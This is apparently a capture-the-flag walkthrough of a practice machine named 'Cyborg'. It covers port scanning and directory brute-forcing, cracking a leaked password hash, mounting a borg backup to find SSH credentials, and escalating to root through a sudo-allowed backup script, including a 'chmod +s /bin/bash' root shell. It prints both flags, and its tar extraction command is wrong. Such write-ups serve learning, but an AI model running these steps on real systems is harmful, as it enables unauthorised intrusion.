# Cyborg Lab Documentaion

Scanned the network with nmap :
```
nmap -sS -A <target ip>
```
Port 22 & 80 were open, so lets's visit the web 

let's do a directory bruteforce

```
dirb https://<ip>
```

discovered the admin path go there and download the **_archive.tar_**

extract the archive.tar with 
```
tar svf archive.tar
```

we should get another directory through dirb **/etc**

let's visit the page and go through it and you'll get **passwd**

we'll get the hash so save the contentes like this
```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

let's identify the hash
```
echo '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.' > hash.txt
```
```
hashcat --identify hash.txt
```
then let's crack the hash with
```
hashcat -a 0 -m 1600 hash.txt /path/rockyou.txt
```
output:
```
$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward
```

Now we can install borgbackup with 
```
sudo apt install borgbackup
```

then create a directory named anything i made *archive*\
while extracting the archive.tar it should give us a path use that path instead of bla bla\
`mkdir archive` & `borg mount /home/bla/bla/ archive` & enter the password we just cracked `squidward`

let's visit the archive folder and go through all the folders to find note.txt\
I found in documents 
```
alex:S3cretP@s3
```
looks like we go some creds let's use ssh to login 

then read the *user.txt*
<details>
    <summary>flag spoiler</summary>
    <p>flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}</p>
</details>

list out the programs we can use as alex with
```
sudo -l
```
read the code and see we can pass `c` flag to execute any code so let's do that
```
sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt"
```
then read the *root.txt*
<details>
    <summary>flag spoiler</summary>
    <p>flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}</p>
</details>

additionally we can use 
```
sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"
```
then
```
bash
```
to get a root shell Bye 